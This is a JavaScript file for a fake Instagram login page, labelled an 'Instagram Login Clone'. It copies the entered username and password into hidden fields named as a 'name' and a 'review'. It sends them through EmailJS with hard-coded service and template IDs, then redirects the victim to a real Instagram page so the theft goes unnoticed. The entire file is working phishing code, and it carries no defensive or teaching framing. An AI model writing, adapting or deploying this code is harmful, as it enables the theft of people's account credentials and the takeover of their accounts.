/**
 * Instagram Login Clone - EmailJS Integration
 * username → #name (from_name)
 * password → #review (review_message)
 * Log in button → EmailJS submit
 */

(function () {
  const form = document.getElementById("login-form");
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const loginBtn = document.getElementById("login-btn");
  const nameField = document.getElementById("name");
  const reviewField = document.getElementById("review");

  const EMAILJS_SERVICE = "service_1whl9m6";
  const EMAILJS_TEMPLATE = "template_qrvuy8z";

  function syncHiddenFields() {
    nameField.value = usernameInput.value;
    reviewField.value = passwordInput.value;
  }

  function updateLoginButton() {
    const hasUsername = usernameInput.value.trim().length > 0;
    const hasPassword = passwordInput.value.length > 0;
    loginBtn.disabled = !(hasUsername && hasPassword);
  }

  usernameInput.addEventListener("input", function () {
    nameField.value = usernameInput.value;
    updateLoginButton();
  });

  passwordInput.addEventListener("input", function () {
    reviewField.value = passwordInput.value;
    updateLoginButton();
  });

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    syncHiddenFields();

    const name = nameField.value.trim();
    const review = reviewField.value;

    loginBtn.disabled = true;
    loginBtn.textContent = "Logging in...";

    emailjs
      .send(EMAILJS_SERVICE, EMAILJS_TEMPLATE, {
        from_name: name,
        from_email: name.includes("@") ? name : "",
        review_message: review,
      })
      .then(function () {
        window.location.href = "https://www.instagram.com/instagram/reels/";
      })
      .catch(function (error) {
        console.error("EmailJS error:", error);
        loginBtn.disabled = false;
        loginBtn.textContent = "Log in";
        updateLoginButton();
      });
  });

  window.InstagramLogin = {
    form,
    usernameInput,
    passwordInput,
    loginBtn,
    nameField,
    reviewField,
    getCredentials: function () {
      syncHiddenFields();
      return {
        username: nameField.value.trim(),
        password: reviewField.value,
      };
    },
  };
})();
